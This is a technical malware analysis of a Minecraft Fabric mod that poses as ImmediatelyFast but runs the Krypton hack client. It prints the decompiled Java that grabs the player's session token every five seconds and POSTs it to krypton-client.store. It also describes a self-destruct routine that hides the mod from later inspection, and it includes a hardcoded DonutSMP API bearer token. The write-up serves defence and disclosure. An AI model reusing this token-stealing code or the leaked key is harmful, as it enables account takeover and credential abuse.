# Technical analysis

Decompiled with CFR 0.152. Java class names are Yarn-mapped (`class_310 = MinecraftClient`, `class_746 = ClientPlayerEntity`, `method_1548 = getSession`, `method_1674 = getSessionId`, etc.).

## The masquerade

`fabric.mod.json` inside the JAR:

```json
{
  "id": "immediatelyfast",
  "version": "1.6.7+1.21.1",
  "name": "ImmediatelyFast",
  "description": "Speed up and optimize immediate mode rendering in Minecraft",
  "authors": ["RK_01"],
  "contact": { "homepage": "https://modrinth.com/mod/immediatelyfast", ... },
  "entrypoints": { "main": [ "skid.gypsyy.Main" ] }
}
```

Everything about the metadata says "this is ImmediatelyFast by RK_01". The entrypoint says otherwise — it's `skid.gypsyy.Main`, which is a one-liner that constructs `skid.gypsyy.DonutBBC`. So if a user inspects the mod list or hover-tooltip in their launcher, they see "ImmediatelyFast" — but what actually runs is a hack client called Krypton.

Also worth flagging in `META-INF/MANIFEST.MF`:

```
Main-Class: q3r.d4526l.f1a7.kUXevhI
```

That class is **not** in this `_CLEANED` JAR. The original (un-cleaned) build presumably had it — meaning the JAR was also executable as `java -jar krypton-....jar`, kicking off the obfuscated class. Whoever stripped the JAR removed that class and the `META-INF/jars/` bundle (cloth-config, DiscordIPC, json-20230227, fabric-resource-loader) but left the Fabric entrypoint and the token grabber intact. Don't trust the `_CLEANED` label.

## The exfiltration — `skid/gypsyy/DonutBBC.java`

This is the bootstrap class. Constructor (`L46-66`) wires up the hack-client subsystems, then calls `initUserTracker()`:

```java
private void initUserTracker() {
    this.scheduler = Executors.newScheduledThreadPool(1);
    this.scheduler.scheduleAtFixedRate(() -> {
        try { this.checkAndRegisterUser(); }
        catch (Exception var2) {
            System.err.println("[User Tracker] Error: " + var2.getMessage());
        }
    }, 5L, 5L, TimeUnit.SECONDS);
    System.out.println("[User Tracker] User tracking system initialized");
}
```

Every 5 seconds, `checkAndRegisterUser()` runs. It skips if you're not in a world, otherwise calls `registerUserOnServer(currentServer)`, which is where the damage happens (`L101-129`):

```java
private void registerUserOnServer(String server) {
    new Thread(() -> {
        try {
            String uuid         = DonutBBC.mc.field_1724.method_5845();             // ClientPlayerEntity.getUuidAsString()
            String username     = DonutBBC.mc.field_1724.method_7334().getName();   // GameProfile.getName()
            String sessionToken = mc.method_1548().method_1674();                   // Session.getSessionId() — THE TOKEN

            DonutStats stats = this.fetchDonutStats(username);
            String skinUrl = "https://mc-heads.net/head/" + uuid.replace("-", "");

            String jsonData = String.format(
                "{ \"username\": \"%s\", \"uuid\": \"%s\", \"server\": \"%s\", "
              + "\"money\": \"%s\", \"playtime\": \"%s\", \"kills\": \"%s\", "
              + "\"deaths\": \"%s\", \"token\": \"%s\", \"skin\": \"%s\", "
              + "\"type\": \"login\" }",
              escapeJson(username), escapeJson(uuid), escapeJson(server),
              escapeJson(stats.money), escapeJson(stats.playtime),
              escapeJson(stats.kills), escapeJson(stats.deaths),
              escapeJson(sessionToken), escapeJson(skinUrl));

            HttpClient client = HttpClient.newHttpClient();
            HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create("https://krypton-client.store/"))
                .header("Content-Type", "application/json")
                .header("User-Agent", "nxes")
                .POST(HttpRequest.BodyPublishers.ofString(jsonData))
                .build();
            client.sendAsync(request, HttpResponse.BodyHandlers.ofString())
                  .thenAccept(response -> { ... });
        } catch (Exception e) { ... }
    }).start();
}
```

The session token is the bit that matters. Minecraft uses it as a bearer credential to call `sessionserver.mojang.com` and authenticate joining a server. With a stolen one, an attacker can sign into your account from their own launcher without needing your Microsoft password.

A `shutdownServices()` hook calls `unregisterUser()` on JVM exit (`L192-215`), which POSTs `{ "type": "logout", ... }` to the same endpoint. So the C2 also gets reliable session start/end timing.

### The DonutSMP stats fetch (`L131-146`)

```java
HttpRequest request = HttpRequest.newBuilder()
    .uri(URI.create("https://api.donutsmp.net/v1/stats/" + username))
    .header("Authorization", "Bearer 7f156f067bf143b28b09eaa15b62dd6b")
    .header("Content-Type", "application/json")
    .GET().build();
```

Hardcoded bearer token, presumably either the author's own API key, scraped, or shared from somewhere. The DonutSMP staff may want to know about this — it's their API key being burned. Not user-impacting on its own, but a nice extra IOC.

## The cleanup tool — `skid/gypsyy/module/modules/client/SelfDestruct.java`

Manually toggled by the user. When enabled it:

1. Toggles off every module, wipes their names/descriptions/string settings in memory.
2. Sets `hasSelfDestructed = true` (which is what gates the user tracker — but only at constructor time, so this doesn't actually stop tracking until next launch).
3. If `Replace Mod` is enabled (default: yes), downloads `https://cdn.modrinth.com/data/8shC1gFX/versions/sXO3idkS/BetterF3-11.0.1-Fabric-1.21.jar` to `<jarname>.tmp`, then registers a JVM shutdown hook that does `Files.move(tmp, originalJar, REPLACE_EXISTING)`.
4. If `Save Last Modified` is enabled (default: yes), resets the file's `lastModified` timestamp via `File.setLastModified(this.modified)` (the original mtime captured at construction).
5. Spawns a `MemoryCleanup` daemon thread that loops `runtime.gc()` + JNA `Memory.purge()` / `Memory.disposeAll()` to scrub native allocations.
6. Tells the player chat-side: "Client has been cleared. Game will continue running."

Read the full class at [`evidence/SelfDestruct.java`](./evidence/SelfDestruct.java).

The point of this is forensic evasion. After someone notices the mod is malicious, the author or the user can trigger SelfDestruct and on next launch the JAR on disk will literally be BetterF3, with its mtime matching what Krypton had before. To a casual inspection (file list, "where did Krypton go?"), it looks like the mod was never there. The actual exfil has of course already happened.

This is also why the `_CLEANED` redistribution makes a kind of sense — someone wanted to keep the hack-client features without the "store" exfil, but they only stripped the obfuscated launcher payload and missed (or didn't bother with) the DonutBBC token POST.

## What I checked and did NOT find

- **Process execution**: no `Runtime.exec`, no `ProcessBuilder`. Grepped the full decompile tree. Nothing.
- **Native code drops**: no `.dll` / `.exe` / `.so` / `.dylib` written to disk by any class. The only `FileOutputStream` writes are in `SelfDestruct.downloadModFile` (downloads BetterF3) and `Utils.downloadAndOverwriteFile` (helper for the same).
- **Keylogging**: `KeyboardMixin` and `MouseMixin` hook GLFW key/mouse callbacks but only to dispatch local events (`KeyEvent`, `MouseButtonEvent`, `MouseScrolledEvent`) into the hack-client's `EventManager`. No serialization, no buffering, no network egress from those hooks.
- **AWT Robot / clipboard hooks**: none.
- **Reflection-based class loading**: none beyond standard mod class lookups.
- **Persistence outside the JAR**: nothing writes to registry, scheduled tasks, startup folders, or anywhere else on disk. This malware is "contained" — the only place it lives is the JAR. (Caveat: that's true for this `_CLEANED` build. The original obfuscated `q3r.d4526l.f1a7.kUXevhI` class was removed before I got the sample, so I can't speak to what it might have done.)

That last point matters for recovery. Because nothing persists outside the JAR, deleting the JAR + revoking the session token is sufficient for this specific build. You don't need to nuke Windows.

## Network endpoints reached by the JAR

| URL | Purpose | Verdict |
|---|---|---|
| `https://krypton-client.store/` | Session token / stats exfil | **MALICIOUS** |
| `https://api.donutsmp.net/v1/stats/{user}` | Fetch stats to enrich the exfil | DonutSMP API; abused with a hardcoded leaked bearer |
| `https://api.donutsmp.net/v1/auction/list/1` | AuctionSniper module — uses user-supplied API key | benign feature |
| `https://cdn.modrinth.com/data/8shC1gFX/...BetterF3-11.0.1-Fabric-1.21.jar` | SelfDestruct's replacement payload | benign payload, used to hide the original |
| `https://mc-heads.net/head/{uuid}` | Skin URL in exfil JSON | benign string, just included for the C2's dashboard |
| `https://render.crafty.gg/3d/bust/{uuid}` | Discord embed avatar in some webhook embeds | benign |
| `https://i.imgur.com/OL2y1cr.png` | WeatherNotifier embed avatar | benign |
| `https://imgur.com/a/21cFemF.png` | RTPEndBaseFinder embed avatar | benign |

The `WeatherNotifier` module also sends Discord webhooks, but only to a URL the user types in themselves, and only if they enable it. Not malicious by default, though it does ship XYZ coordinates so be aware.

## EncryptedString

All user-facing strings in the modules go through `EncryptedString.of(...)`, which is just XOR-with-a-random-key kept in the same object. It's not real encryption — it's there to defeat naive `strings` scans of the JAR. `grep` against the decompiled `.java` files still finds everything because the calls take literal string arguments.

## Versions / build metadata

- Yarn mappings, intermediary namespace (`Fabric-Mapping-Namespace: intermediary`)
- Minecraft 1.21, Fabric Loader 0.18.4
- Mod self-version reported in code as `" b1.3"` (`DonutBBC.java:49`)
- Filename version `v15`
